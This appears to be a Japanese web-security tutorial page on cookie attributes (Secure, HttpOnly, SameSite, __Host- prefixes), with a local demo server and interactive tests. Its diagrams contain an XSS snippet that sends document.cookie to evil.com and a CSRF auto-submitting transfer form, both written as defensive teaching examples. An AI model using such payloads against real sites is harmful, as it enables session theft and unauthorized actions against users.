@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTTP Header Lab 05 - Cookieセキュリティ</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Noto+Sans+JP:wght@400;700&display=swap');
+  :root {
+    --bg:#ffffff;--surface:#f5f7fa;--surface2:#ebeef2;--border:#c8cdd3;
+    --text:#1a1a2e;--text-dim:#5c6370;
+    --accent:#005cc5;--accent2:#22863a;--accent3:#6f42c1;
+    --warn:#b08800;--danger:#cb2431;--code-bg:#f0f4f8;--radius:10px;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{font-family:'Noto Sans JP',sans-serif;background:var(--bg);color:var(--text);line-height:1.8;padding:2rem;max-width:1100px;margin:0 auto;}
+  h1{font-size:1.6rem;color:var(--accent);border-bottom:2px solid var(--border);padding-bottom:0.8rem;margin-bottom:1.5rem;font-family:'IBM Plex Mono',monospace;}
+  h2{font-size:1.25rem;color:var(--accent2);margin:2rem 0 1rem;font-family:'IBM Plex Mono',monospace;}
+  h3{font-size:1.05rem;color:var(--accent3);margin:1.5rem 0 0.8rem;}
+  p,li{font-size:0.92rem;margin-bottom:0.5rem;}
+  .status-bar{display:flex;gap:1rem;align-items:center;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:0.6rem 1rem;margin-bottom:1.5rem;font-size:0.82rem;font-family:'IBM Plex Mono',monospace;flex-wrap:wrap;}
+  .status-item{display:flex;align-items:center;gap:0.4rem;}
+  .status-dot{width:10px;height:10px;border-radius:50%;background:var(--text-dim);animation:pulse 1.5s infinite;}
+  .status-dot.ok{background:var(--accent);animation:none;}.status-dot.err{background:var(--danger);animation:none;}
+  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.4;}}
+  .alert-critical{background:#fef2f2;border:2px solid var(--danger);border-radius:var(--radius);padding:1rem 1.2rem;margin-bottom:1.5rem;font-size:0.88rem;display:none;}
+  .alert-critical strong{color:var(--danger);}
+  .lab-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;margin:1.5rem 0;}
+  .step{background:var(--surface2);border-left:3px solid var(--accent2);border-radius:0 var(--radius) var(--radius) 0;padding:1rem 1.2rem;margin:1rem 0;}
+  .step-num{font-family:'IBM Plex Mono',monospace;color:var(--accent2);font-weight:600;font-size:0.8rem;margin-bottom:0.3rem;}
+  code,pre{font-family:'IBM Plex Mono',monospace;font-size:0.82rem;}
+  code{background:var(--code-bg);padding:0.15rem 0.4rem;border-radius:4px;color:var(--accent);}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:var(--radius);padding:1rem;overflow-x:auto;margin:0.8rem 0;line-height:1.6;color:#24292e;}
+  pre .comment{color:#6a737d;}pre .header-name{color:var(--accent2);}pre .header-val{color:var(--accent);}pre .highlight{color:var(--warn);font-weight:600;}
+  .placeholder{color:var(--text-dim);font-style:italic;font-size:0.8rem;}
+  .note{background:#e8f4fd;border:1px solid #b6d4e8;border-radius:var(--radius);padding:0.8rem 1rem;margin:1rem 0;font-size:0.85rem;color:var(--accent2);}
+  .note::before{content:"💡 ";}
+  .warn-box{background:#fff8e1;border:1px solid #e6d590;border-radius:var(--radius);padding:0.8rem 1rem;margin:1rem 0;font-size:0.85rem;color:var(--warn);}
+  .warn-box::before{content:"⚠️ ";}
+  .danger-box{background:#fef2f2;border:1px solid #f5c6c6;border-radius:var(--radius);padding:0.8rem 1rem;margin:1rem 0;font-size:0.85rem;color:var(--danger);}
+  .danger-box::before{content:"🔴 ";}
+  .check-item{background:var(--surface2);border-radius:var(--radius);padding:0.6rem 1rem;margin:0.4rem 0;display:flex;align-items:center;gap:0.6rem;font-size:0.88rem;transition:opacity 0.3s;}
+  .check-item input[type="checkbox"]{width:18px;height:18px;accent-color:var(--accent);flex-shrink:0;}
+  .check-item.checked{opacity:0.55;}
+  .diagram{background:var(--code-bg);border:1px solid var(--border);border-radius:var(--radius);padding:1.2rem;font-family:'IBM Plex Mono',monospace;font-size:0.78rem;line-height:1.5;overflow-x:auto;white-space:pre;color:var(--text-dim);margin:1rem 0;}
+  .two-col{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+  @media(max-width:768px){.two-col{grid-template-columns:1fr;}}
+  .col-card{background:var(--code-bg);border:1px solid var(--border);border-radius:var(--radius);padding:0.8rem;font-size:0.8rem;}
+  .col-card h4{font-family:'IBM Plex Mono',monospace;font-size:0.78rem;margin-bottom:0.5rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border);}
+  .col-card pre{border:none;padding:0.4rem 0;margin:0;font-size:0.75rem;background:transparent;}
+  a{color:var(--accent2);text-decoration:none;}a:hover{text-decoration:underline;}
+  hr{border:none;border-top:1px solid var(--border);margin:2.5rem 0;}
+  html{scroll-behavior:smooth;}
+  .btn{border:none;padding:0.5rem 1.2rem;border-radius:6px;cursor:pointer;font-weight:600;font-size:0.85rem;font-family:'Noto Sans JP',sans-serif;margin:0.3rem;transition:opacity 0.2s;}
+  .btn:hover{opacity:0.85;}.btn:active{transform:scale(0.97);}.btn:disabled{opacity:0.4;cursor:not-allowed;}
+  .btn-accent{background:var(--accent);color:var(--bg);}.btn-accent2{background:var(--accent2);color:var(--bg);}
+  .btn-accent3{background:var(--accent3);color:var(--bg);}.btn-warn{background:var(--warn);color:var(--bg);}
+  .btn-dim{background:var(--surface2);color:var(--text-dim);border:1px solid var(--border);}
+  .toc{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1rem 1.2rem;margin:1rem 0 2rem;}
+  .toc a{display:inline-block;padding:0.25rem 0.6rem;margin:0.15rem;border-radius:6px;font-size:0.82rem;background:var(--surface2);transition:background 0.2s;}
+  .toc a:hover{background:var(--border);text-decoration:none;}
+  .cookie-table{width:100%;border-collapse:collapse;font-size:0.82rem;margin:0.8rem 0;}
+  .cookie-table th{background:var(--surface2);color:var(--accent);padding:0.5rem 0.6rem;text-align:left;font-family:'IBM Plex Mono',monospace;border-bottom:2px solid var(--accent);}
+  .cookie-table td{padding:0.45rem 0.6rem;border-bottom:1px solid var(--border);vertical-align:top;}
+  .cookie-table tr:hover{background:var(--surface);}
+</style>
+</head>
+<body>
+
+<!-- STATUS BAR -->
+<div class="status-bar">
+  <div class="status-item"><div class="status-dot" id="dot-protocol"></div><span id="status-protocol">確認中...</span></div>
+  <div class="status-item"><div class="status-dot" id="dot-devtools"></div><span>DevTools: <kbd style="background:var(--surface2);padding:0.1rem 0.4rem;border-radius:4px;">F12</kbd> → Application タブ</span></div>
+</div>
+<p style="margin-bottom:0.5rem;font-size:0.82rem;"><a href="http-header-lab-index.html" style="color:var(--accent);text-decoration:none;">← マスター索引に戻る</a></p>
+<script>
+(function(){const d=document.getElementById('dot-protocol'),l=document.getElementById('status-protocol');if(location.protocol==='file:'){d.classList.add('err');l.innerHTML='<strong style="color:var(--danger)">file:// 検出</strong>';document.getElementById('file-protocol-alert').style.display='block';}else{d.classList.add('ok');l.textContent=location.protocol+'// ✅';}})();
+</script>
+
+<div class="alert-critical" id="file-protocol-alert">
+  <strong>🔴 HTTP サーバー経由で開いてください</strong><br>
+  <code id="dynamic-url-alert"></code> でアクセスしてください。
+</div>
+<script>
+  const dynAlert = document.getElementById('dynamic-url-alert');
+  if (dynAlert) dynAlert.textContent = location.protocol + '//' + location.host + '/http-header-lab-05.html';
+</script>
+
+<!-- ── サーバー側Cookie設定ガイド ── -->
+<div class="lab-box" style="border-color:var(--warn); margin-bottom:1rem;">
+  <h3 style="color:var(--warn); margin-top:0;">🖥 サーバー側からCookieを返すエンドポイントの追加（推奨）</h3>
+  <p>
+    HttpOnly / Secure / __Host- の本質は<strong>「サーバーが Set-Cookie レスポンスヘッダーで返す」</strong>ことにあります。
+    Lab 01 で使用しているNode.jsサーバーに、Cookie設定用のエンドポイントを追加すると実験の体感が大幅に向上します。
+  </p>
+
+  <div class="step">
+    <div class="step-num">セットアップ — cookie-server.js を作成して起動</div>
+    <p>以下のファイルを <code>C:\Users\user\ClaudeCode\HTTPHeader\cookie-server.js</code> として保存し、別のコマンドプロンプトで起動します。</p>
+    <pre><span class="comment">// cookie-server.js — Lab 05 用 Cookie設定サーバー（ポート7891）</span>
+const http = require('http');
+const url = require('url');
+
+http.createServer((req, res) => {
+  const parsed = url.parse(req.url, true);
+  res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:7890');
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
+  res.setHeader('Content-Type', 'application/json; charset=utf-8');
+
+  if (parsed.pathname === '/set-cookies') {
+    <span class="comment">// HttpOnly Cookie（JSから読めない）</span>
+    res.setHeader('Set-Cookie', [
+      'server_httponly=秘密の値; Path=/; HttpOnly; Max-Age=300',
+      'server_visible=読める値; Path=/; Max-Age=300',
+      'server_samesite_lax=lax値; Path=/; SameSite=Lax; Max-Age=300',
+      'server_samesite_strict=strict値; Path=/; SameSite=Strict; Max-Age=300'
+    ]);
+    res.writeHead(200);
+    res.end(JSON.stringify({ message: 'Cookies set!', cookies: [
+      'server_httponly (HttpOnly)', 'server_visible (通常)',
+      'server_samesite_lax (Lax)', 'server_samesite_strict (Strict)'
+    ]}));
+  } else if (parsed.pathname === '/check-cookies') {
+    res.writeHead(200);
+    res.end(JSON.stringify({
+      received_cookies: req.headers.cookie || '(なし)',
+      message: 'サーバーが受け取ったCookieヘッダー'
+    }));
+  } else if (parsed.pathname === '/clear-cookies') {
+    res.setHeader('Set-Cookie', [
+      'server_httponly=; Path=/; HttpOnly; Max-Age=0',
+      'server_visible=; Path=/; Max-Age=0',
+      'server_samesite_lax=; Path=/; Max-Age=0',
+      'server_samesite_strict=; Path=/; Max-Age=0'
+    ]);
+    res.writeHead(200);
+    res.end(JSON.stringify({ message: 'All cookies cleared' }));
+  } else {
+    res.writeHead(404);
+    res.end('Not found');
+  }
+}).listen(7891, () => console.log('Cookie Server: http://127.0.0.1:7891'));</pre>
+    <pre><span class="comment"># 起動コマンド（別のコマンドプロンプトで）:</span>
+<span class="highlight">node C:\Users\user\ClaudeCode\HTTPHeader\cookie-server.js</span>
+<span class="comment"># → Cookie Server: http://127.0.0.1:7891</span></pre>
+  </div>
+
+  <div class="note">
+    <strong>このサーバーは任意です</strong>。起動しなくても Lab 05 の学習は可能です（OutSystems でも確認できます）。
+    ただし、HttpOnly Cookie の体感には<strong>サーバー側からの Set-Cookie が不可欠</strong>なため、強く推奨します。
+  </div>
+</div>
+
+<h1>🧪 Lab 05: Cookieセキュリティ</h1>
+<p style="font-size:0.72rem;color:var(--text-dim);margin-bottom:0.3rem;font-family:'IBM Plex Mono',monospace;">最終更新: 2026年3月</p>
+<p style="color:var(--text-dim); font-size:0.88rem; margin-bottom:1rem;">
+  ～ Secure, HttpOnly, SameSite, __Host- / __Secure- プレフィックスを体感する ～
+</p>
+<div style="display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:1rem;">
+  <span style="background:var(--surface2);padding:0.3rem 0.8rem;border-radius:6px;font-size:0.8rem;font-family:'IBM Plex Mono',monospace;">⏱ 所要時間：25分</span>
+  <span style="background:var(--surface2);padding:0.3rem 0.8rem;border-radius:6px;font-size:0.8rem;font-family:'IBM Plex Mono',monospace;">難易度：★★☆</span>
+</div>
+<p style="font-size:0.82rem;color:var(--text-dim);margin-bottom:1rem;">📋 前提知識：<a href="http-header-lab-04.html">Lab 04</a> 必須（Cookie の Set-Cookie / Domain / Path の基本）</p>
+
+<div class="lab-box" style="border-color:var(--accent); margin-bottom:1rem;">
+  <h3 style="color:var(--accent); margin-top:0;">🎯 このLabの学習目標</h3>
+  <p style="margin-bottom:0.3rem;">完了すると、以下ができるようになります：</p>
+  <div class="check-item" style="opacity:1;"><span>1. <code>Secure</code> 属性がHTTP通信での Cookie 漏洩を防ぐ仕組みを体感する</span></div>
+  <div class="check-item" style="opacity:1;"><span>2. <code>HttpOnly</code> 属性がXSS攻撃による Cookie 盗取を防ぐ仕組みを体感する</span></div>
+  <div class="check-item" style="opacity:1;"><span>3. <code>SameSite</code> の3つの値（Strict / Lax / None）の違いと CSRF 防止効果を理解する</span></div>
+  <div class="check-item" style="opacity:1;"><span>4. <code>__Host-</code> / <code>__Secure-</code> プレフィックスの強制効果を理解する</span></div>
+  <div class="check-item" style="opacity:1;"><span>5. 実務で推奨される Cookie 設定パターンを判断できるようになる</span></div>
+</div>
+<div class="warn-box" style="border-color:var(--accent3);background:#fce4ec;">
+  <strong style="color:var(--accent3);">💥 実務での失敗例</strong>：<code>SameSite</code> 未設定 + <code>HttpOnly</code> なしのセッションCookieがCSRF攻撃とXSSで同時に悪用された
+</div>
+
+<div class="warn-box">
+  <strong style="color:var(--danger);">このLabのDevTools活用</strong>:
+  <strong>Application タブ → Cookies</strong> で属性を確認。
+  <strong>Console タブ</strong> で <code>document.cookie</code> を実行して HttpOnly の効果を確認。
+</div>
+
+<div class="toc">
+  <strong style="color:var(--text-dim);font-size:0.82rem;">目次:</strong><br>
+  <a href="#concept">脅威と防御の全体像</a>
+  <a href="#exp-5a">5-A: Secure</a>
+  <a href="#exp-5b">5-B: HttpOnly</a>
+  <a href="#exp-5c">5-C: SameSite</a>
+  <a href="#exp-5d">5-D: プレフィックス</a>
+  <a href="#exp-5e">5-E: OutSystems 実践</a>
+  <a href="#bestpractice">推奨設定パターン</a>
+  <a href="#checklist">✅ チェックリスト</a>
+  <a href="#chips">CHIPS</a>
+  <a href="#framework">🔧 設定例</a>
+</div>
+
+<!-- ── 概念整理 ── -->
+<div class="lab-box" id="concept">
+  <h3>Cookie のセキュリティ属性 — 脅威と防御の対応</h3>
+
+  <div class="diagram">攻撃手法                 防御する属性              防御メカニズム
+─────────────────────────────────────────────────────────────────────
+中間者攻撃（MITM）      Secure                   HTTPS時のみCookieを送信
+  HTTP通信の盗聴で                                → HTTP経路でのCookie漏洩を防止
+  Cookieを傍受
+
+XSS（クロスサイト        HttpOnly                 JSからCookieにアクセス不可
+  スクリプティング）                               → document.cookie で読めない
+  悪意あるスクリプトで                             → 盗取・外部送信を防止
+  Cookieを盗取
+
+CSRF（クロスサイト       SameSite                 クロスサイトリクエストで
+  リクエスト偽造）                                 Cookieの自動送信を制限
+  別サイトから本人の                               → 意図しない操作を防止
+  認証情報で操作実行
+
+Cookie固定攻撃          __Host- プレフィックス     Secure + Path=/ + Domain未指定
+  サブドメインから                                  を強制。属性の上書きを防止
+  Cookie上書き</div>
+
+  <div class="note">
+    <strong>各属性は独立した防御層</strong>:
+    Secure だけでは XSS を防げず、HttpOnly だけでは CSRF を防げません。
+    すべての属性を適切に組み合わせることで多層防御が実現します。<br>
+    <span style="font-size:0.78rem; color:var(--text-dim);">📖 参考: <a href="https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies#cookie_%E3%81%B8%E3%81%AE%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%AE%E5%88%B6%E5%BE%A1" target="_blank">MDN — Cookieへのアクセスの制御</a></span>
+  </div>
+</div>
+
+<!-- ── 実験 5-A: Secure ── -->
+<div class="lab-box" id="exp-5a">
+  <h3>実験 5-A: Secure — HTTPS でのみ送信</h3>
+  <p>
+    <code>Secure</code> 属性が付いた Cookie は HTTPS 接続時のみ送信されます。
+    HTTP（平文）ではネットワーク上を流れる際に盗聴可能なため、この属性で防ぎます。
+  </p>
+
+  <div class="diagram">Secure 属性の効果:
+
+  Set-Cookie: session=abc; Secure
+
+  https://example.com/page  → Cookie 送信される ✅
+  http://example.com/page   → Cookie 送信されない ❌ ← 盗聴防止
+
+  なぜ重要か:
+  ┌────────────┐     ┌──────────┐     ┌────────────┐
+  │  Browser   │ ──▶ │ 攻撃者   │ ──▶ │  Server    │
+  │            │  HTTP通信を   │     │            │
+  │ Cookie:    │  盗聴可能     │     │            │
+  │ session=abc│              │     │            │
+  └────────────┘              │     └────────────┘
+                    Secure なし: Cookie が丸見え！
+                    Secure あり: HTTP では送信されないので安全</div>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — Secure 属性の確認</div>
+    <p>
+      このページは <code id="current-origin-5a"></code> で動作しています。
+    </p>
+    <script>document.getElementById('current-origin-5a').textContent = location.origin;</script>
+    <button class="btn btn-accent" id="btn-secure-test">Secure なし Cookie を設定</button>
+    <button class="btn btn-accent2" id="btn-secure-check">document.cookie で確認</button>
+    <pre id="secure-result"><span class="placeholder">← ボタンを押すと結果が表示されます</span></pre>
+  </div>
+
+  <script>
+    document.getElementById('btn-secure-test').addEventListener('click', () => {
+      const el = document.getElementById('secure-result');
+      document.cookie = 'lab05_nosecure=visible; Path=/; Max-Age=300';
+      document.cookie = 'lab05_secure=hidden; Path=/; Max-Age=300; Secure';
+
+      const isLocalhost = location.hostname === '127.0.0.1' || location.hostname === 'localhost';
+      const isHttps = location.protocol === 'https:';
+      const secureSet = document.cookie.includes('lab05_secure');
+
+      el.textContent = '設定を試みました:\n\n'
+        + '1. lab05_nosecure=visible (Secure なし)\n'
+        + '   → 設定成功（HTTP/HTTPSどちらでもOK）\n\n'
+        + '2. lab05_secure=hidden (Secure あり)\n'
+        + '   → ' + (secureSet
+          ? (isLocalhost && !isHttps
+            ? '設定成功（⚠ localhost例外 — 下記参照）'
+            : '設定成功（HTTPS環境）')
+          : '設定拒否（HTTP環境では Secure Cookie を設定できない）')
+        + '\n\nDevTools → Application → Cookies → ' + location.host + '\nで確認してください。';
+
+      if (isLocalhost && !isHttps && secureSet) {
+        el.textContent += '\n\n⚠ Secure Context の localhost 例外:\n'
+          + '  Chrome/Edge は 127.0.0.1 と localhost を\n'
+          + '  「Secure Context」として特別扱いするため、\n'
+          + '  HTTP でも Secure Cookie が設定できてしまいます。\n'
+          + '  本番環境（HTTP）では設定拒否されます。\n'
+          + '  → OutSystems（HTTPS）で正しい挙動を確認してください。';
+      }
+    });
+
+    document.getElementById('btn-secure-check').addEventListener('click', () => {
+      const el = document.getElementById('secure-result');
+      const cookies = document.cookie;
+      el.textContent = 'document.cookie の値:\n  ' + (cookies || '(空)')
+        + '\n\n→ lab05_nosecure は表示される'
+        + '\n→ lab05_secure は ' + (cookies.includes('lab05_secure') ? '表示されている（localhost例外）' : '存在しない（設定拒否済み）');
+    });
+  </script>
+
+  <div class="note">
+    <strong>OutSystems で Secure を確認するには</strong>:
+    OutSystems Personal Environment は HTTPS で動作するため、Secure 属性付きの Cookie を正しく設定できます。
+    実験 5-E で OutSystems 上で Secure Cookie を設定し、動作を確認します。
+  </div>
+</div>
+
+<!-- ── 実験 5-B: HttpOnly ── -->
+<div class="lab-box" id="exp-5b">
+  <h3>実験 5-B: HttpOnly — JavaScript からのアクセスを禁止</h3>
+  <p>
+    <code>HttpOnly</code> 属性が付いた Cookie は <code>document.cookie</code> で読み取れません。
+    XSS 攻撃でスクリプトが実行されても、Cookie を盗むことができなくなります。
+  </p>
+
+  <div class="diagram">XSS 攻撃シナリオ（HttpOnly なし）:
+
+  1. 攻撃者がサイトの入力欄に悪意あるスクリプトを仕込む
+     &lt;script&gt;
+       fetch('https://evil.com/steal?cookie=' + document.cookie);
+     &lt;/script&gt;
+
+  2. 被害者がそのページを閲覧
+     → スクリプトが実行され、document.cookie の値が攻撃者のサーバーに送信される
+
+  HttpOnly ありの場合:
+  → document.cookie にセッションCookieが含まれない
+  → 攻撃者は Cookie を盗めない！
+
+  ただし注意:
+  → HttpOnly は Cookie の「読み取り」を防ぐだけ
+  → Cookie の「送信」自体は防がない（CSRF対策は SameSite が担当）</div>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — JS で設定した Cookie の読み取りを確認</div>
+    <p>JS から設定した Cookie と、サーバーが HttpOnly で設定した Cookie の違いを確認します。</p>
+    <button class="btn btn-accent3" id="btn-httponly">JS で Cookie を設定 &amp; 読み取り</button>
+    <pre id="httponly-result"><span class="placeholder">← ボタンを押すと結果が表示されます</span></pre>
+  </div>
+
+  <script>
+    document.getElementById('btn-httponly').addEventListener('click', () => {
+      const el = document.getElementById('httponly-result');
+      document.cookie = 'lab05_js_cookie=jsで設定した値; Path=/; Max-Age=300';
+      const cookies = document.cookie;
+      el.textContent = '実験結果:\n\n'
+        + '1. JS で設定した Cookie（HttpOnly なし）:\n'
+        + '   document.cookie = "lab05_js_cookie=jsで設定した値"\n'
+        + '   → 設定成功 → document.cookie で読み取り可能\n\n'
+        + '2. document.cookie:\n'
+        + '   ' + (cookies || '(空)') + '\n\n'
+        + '→ JS で設定した Cookie は当然 JS から読める\n'
+        + '→ では HttpOnly Cookie はどうなるか？ → STEP 2 へ';
+    });
+  </script>
+
+  <div class="step">
+    <div class="step-num">STEP 2 — サーバー側から HttpOnly Cookie を設定して比較</div>
+    <p>
+      cookie-server.js（上部のセットアップ参照）が起動していれば、
+      サーバーから HttpOnly 付き Cookie を設定できます。
+    </p>
+    <button class="btn btn-accent" id="btn-httponly-server">サーバーから Cookie を設定</button>
+    <button class="btn btn-accent2" id="btn-httponly-compare">document.cookie で読み取り比較</button>
+    <button class="btn btn-dim" id="btn-httponly-clear">サーバーCookie削除</button>
+    <pre id="httponly-server-result"><span class="placeholder">← cookie-server.js が起動していればボタンを押してください</span></pre>
+  </div>
+
+  <script>
+    document.getElementById('btn-httponly-server').addEventListener('click', async () => {
+      const el = document.getElementById('httponly-server-result');
+      const btn = document.getElementById('btn-httponly-server');
+      btn.disabled = true;
+      el.textContent = 'サーバーにリクエスト中...';
+      try {
+        const res = await fetch('http://127.0.0.1:7891/set-cookies', { credentials: 'include' });
+        if (!res.ok) throw new Error('HTTPエラー: ' + res.status);
+        const data = await res.json();
+        console.log('【5-B】サーバーCookie設定:', data);
+        el.textContent = '✅ サーバーから Cookie を設定しました！\n\n'
+          + '設定された Cookie:\n'
+          + data.cookies.map(c => '  • ' + c).join('\n')
+          + '\n\nDevTools → Application → Cookies → 127.0.0.1 で確認:\n'
+          + '  server_httponly → HttpOnly: ✅（JSから読めない！）\n'
+          + '  server_visible  → HttpOnly: ❌（JSから読める）\n\n'
+          + '→ 「document.cookie で読み取り比較」ボタンで差を体感してください';
+      } catch(e) {
+        el.textContent = '❌ エラー: ' + e.message
+          + '\n\ncookie-server.js が起動していない可能性があります。\n'
+          + '上部の「サーバー側からCookieを返すエンドポイントの追加」を参照してください。\n\n'
+          + '代替: OutSystems（実験 5-E）で HttpOnly Cookie を確認できます。';
+      }
+      btn.disabled = false;
+    });
+
+    document.getElementById('btn-httponly-compare').addEventListener('click', () => {
+      const el = document.getElementById('httponly-server-result');
+      const cookies = document.cookie;
+      const hasVisible = cookies.includes('server_visible');
+      const hasHttpOnly = cookies.includes('server_httponly');
+      el.textContent = 'document.cookie の値:\n  ' + (cookies || '(空)')
+        + '\n\n比較結果:\n'
+        + '  server_visible  → ' + (hasVisible ? '✅ 読める（HttpOnly なし）' : '❌ 見つからない') + '\n'
+        + '  server_httponly  → ' + (hasHttpOnly ? '⚠ 読めている（想定外）' : '🔒 読めない！（HttpOnly の効果）') + '\n\n'
+        + (!hasHttpOnly && hasVisible
+          ? '✅ HttpOnly の効果を確認できました！\n'
+            + '  server_httponly は Application タブには表示されるが、\n'
+            + '  document.cookie には含まれない = XSSで盗取不可能'
+          : hasHttpOnly
+            ? '⚠ HttpOnly Cookie が読めています。cookie-server.js の設定を確認してください。'
+            : 'cookie-server.js から Cookie を設定してから実行してください。');
+    });
+
+    document.getElementById('btn-httponly-clear').addEventListener('click', async () => {
+      const el = document.getElementById('httponly-server-result');
+      try {
+        await fetch('http://127.0.0.1:7891/clear-cookies', { credentials: 'include' });
+        el.textContent = '🗑 サーバーCookie を削除しました';
+      } catch(e) { el.textContent = 'エラー: ' + e.message; }
+    });
+  </script>
+
+  <div class="warn-box">
+    <strong>HttpOnly は JS で設定できない</strong>:
+    <code>document.cookie = "name=value; HttpOnly"</code> と書いても<strong>効果がありません</strong>。
+    HttpOnly は<strong>サーバーが Set-Cookie レスポンスヘッダーで設定する場合にのみ</strong>有効です。
+    これは実験 5-E（OutSystems）で確認します。
+  </div>
+
+  <div class="danger-box">
+    <strong>HttpOnly の正しい位置づけ: 多層防御の最後の砦（Defense in Depth）</strong>:<br>
+    HttpOnly は Cookie の「読み取り」を防ぎますが、XSS が成功した時点で他の被害（DOM操作、
+    偽フォーム表示、キーロガー設置等）は防げません。
+    <strong>CSP（Lab 08）でXSS自体を防ぐことが本質的な対策</strong>です。<br>
+    HttpOnly はCSPを突破された場合の<strong>最後の防御層</strong>として、セッションCookieの盗取だけは防ぎます。
+    セキュリティは1つの対策に頼るのではなく、複数の層を重ねることが重要です。
+  </div>
+</div>
+
+<!-- ── 実験 5-C: SameSite ── -->
+<div class="lab-box" id="exp-5c">
+  <h3>実験 5-C: SameSite — CSRF 攻撃を防ぐ</h3>
+  <p>
+    <code>SameSite</code> 属性は、クロスサイトリクエスト（別サイトから発信されたリクエスト）で
+    Cookie を送信するかどうかを制御します。CSRF 攻撃の主要な防御手段です。
+  </p>
+
+  <div class="diagram">CSRF 攻撃シナリオ:
+
+  1. ユーザーが bank.com にログイン済み（セッションCookie保持）
+  2. ユーザーが evil.com を閲覧
+  3. evil.com に埋め込まれたフォームが bank.com に送金リクエストを送信:
+     &lt;form action="https://bank.com/transfer" method="POST"&gt;
+       &lt;input name="to" value="attacker"&gt;
+       &lt;input name="amount" value="1000000"&gt;
+     &lt;/form&gt;
+     &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+  4. ブラウザが bank.com のセッションCookieを自動送信
+     → ユーザーの意図しない送金が実行される！
+
+SameSite による防御:
+  SameSite=Strict → evil.com からの全リクエストで Cookie 不送信
+  SameSite=Lax    → evil.com からのPOSTでは Cookie 不送信（GETナビゲーションは許可）
+  SameSite=None   → 制限なし（Secure 必須）← サードパーティ埋め込み用</div>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — SameSite の3つの値を比較</div>
+  </div>
+
+  <table class="cookie-table">
+    <thead>
+      <tr><th>値</th><th>同一サイトリクエスト</th><th>クロスサイト GETナビゲーション</th><th>クロスサイト POST</th><th>用途</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>Strict</code></td>
+        <td style="color:var(--accent);">✅ 送信</td>
+        <td style="color:var(--danger);">❌ 不送信</td>
+        <td style="color:var(--danger);">❌ 不送信</td>
+        <td>銀行、重要操作</td>
+      </tr>
+      <tr>
+        <td><code>Lax</code></td>
+        <td style="color:var(--accent);">✅ 送信</td>
+        <td style="color:var(--accent);">✅ 送信</td>
+        <td style="color:var(--danger);">❌ 不送信</td>
+        <td>一般的なセッション（推奨デフォルト）</td>
+      </tr>
+      <tr>
+        <td><code>None</code></td>
+        <td style="color:var(--accent);">✅ 送信</td>
+        <td style="color:var(--accent);">✅ 送信</td>
+        <td style="color:var(--accent);">✅ 送信</td>
+        <td>サードパーティ埋め込み（Secure必須）</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="step">
+    <div class="step-num">STEP 2 — Strict vs Lax の実務的な違い</div>
+    <pre><span class="header-name">SameSite=Strict の問題点:</span>
+  外部サイトのリンクから自サイトに遷移した場合も Cookie が送信されない
+  → ユーザーがメールのリンクをクリック → ログイン画面が表示される（不便）
+  → SNSからのリンク → 毎回ログインが必要（UX悪化）
+
+<span class="header-name">SameSite=Lax の妥協点:</span>
+  トップレベルナビゲーション（リンクのクリック）の GET では Cookie を送信
+  → メールのリンク → ログイン済みで表示される ✅
+  → ただし POST（フォーム送信）は送信されない → CSRF は防げる ✅
+  → <span class="highlight">多くの場合、Lax が最適なバランス</span>
+
+<span class="header-name">SameSite=None; Secure の使用場面:</span>
+  サードパーティの iframe 内で Cookie が必要な場合
+  → 決済ウィジェット、埋め込みチャット、SSO の iframe 等
+  → <span class="highlight">必ず Secure と組み合わせること</span>（ないとブラウザが拒否）
+  → サードパーティCookieブロック（Safari ITP等）の影響を受ける</pre>
+  </div>
+
+  <div class="note">
+    <strong>Chrome のデフォルト</strong>:
+    SameSite を指定しない場合、Chrome は<strong>デフォルトで Lax</strong> として扱います（2020年〜）。
+    ただし明示的に設定することが強く推奨されます。<br>
+    <span style="font-size:0.78rem; color:var(--text-dim);">📖 参考: <a href="https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value" target="_blank">MDN — SameSite</a></span>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 3 — Partitioned 属性（CHIPS）— SameSite=None の進化形</div>
+    <pre><span class="comment">// SameSite=None でサードパーティCookieを使う場合の問題:</span>
+<span class="comment">//   サイトA上でも サイトB上でも 同じCookieが送信される</span>
+<span class="comment">//   → クロスサイトトラッキングに悪用可能</span>
+
+<span class="header-name">Partitioned（CHIPS）で解決:</span>
+  Set-Cookie: __Secure-embed=xyz;
+    Path=/; Secure; HttpOnly;
+    <span class="highlight">SameSite=None; Partitioned</span>
+
+  サイトA上での embed Cookie → 「サイトA × embed」として分離保存
+  サイトB上での embed Cookie → 「サイトB × embed」として分離保存
+  → 同じ名前のCookieでも、トップレベルサイトごとに別物として扱われる
+  → クロスサイトトラッキングは不可能に
+
+<span class="comment">// 用途:</span>
+  決済ウィジェット、埋め込みチャット、SSO iframe 等
+  → 「状態保持は必要だが、トラッキングはさせたくない」場合に最適
+
+<span class="comment">// ブラウザ対応: Chrome 114+、Edge 114+（2023年〜）</span></pre>
+  </div>
+</div>
+
+<!-- ── 実験 5-D: プレフィックス ── -->
+<div class="lab-box" id="exp-5d">
+  <h3>実験 5-D: __Host- / __Secure- プレフィックス — 属性の強制</h3>
+  <p>
+    Cookie 名にプレフィックスを付けることで、特定の属性設定を<strong>ブラウザが強制</strong>します。
